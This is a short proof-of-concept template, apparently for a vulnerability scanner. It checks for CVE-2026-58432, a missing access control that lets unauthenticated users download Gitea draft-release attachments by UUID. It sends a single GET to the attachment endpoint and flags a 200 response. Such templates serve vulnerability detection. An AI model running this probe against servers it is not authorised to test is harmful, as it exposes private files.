[info]
author = "ave"
description = "验证Gitea草稿版本附件访问控制缺失：未认证用户通过UUID下载端点可直接获取草稿附件内容"
id = "POC-AVE-2026-0669"
name = "CVE-2026-58432 PoC"
severity = "medium"
tags = ["ave-2026-0669"]
vuln_id = [
    "CVE-2026-58432",
    "AVE-2026-0669",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/attachments/{{uuid}}"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"
